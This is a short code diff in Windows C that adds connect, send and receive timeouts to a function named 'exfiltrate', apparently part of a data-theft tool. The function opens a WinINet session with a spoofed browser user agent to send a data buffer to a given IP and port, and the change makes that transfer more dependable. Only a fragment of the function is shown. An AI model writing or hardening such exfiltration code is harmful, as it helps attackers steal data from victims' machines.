@@ -22,6 +22,12 @@ static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
     HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInet) return FALSE;
 
+    // Set timeouts (10s) to prevent indefinite blocking
+    DWORD timeout_ms = 10000;
+    InternetSetOptionA(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+    InternetSetOptionA(hInet, INTERNET_OPTION_SEND_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+    InternetSetOptionA(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout_ms, sizeof(timeout_ms));
+
     char host_port[64];
     snprintf(host_port, sizeof(host_port), "%s:%d", ip, port);
 
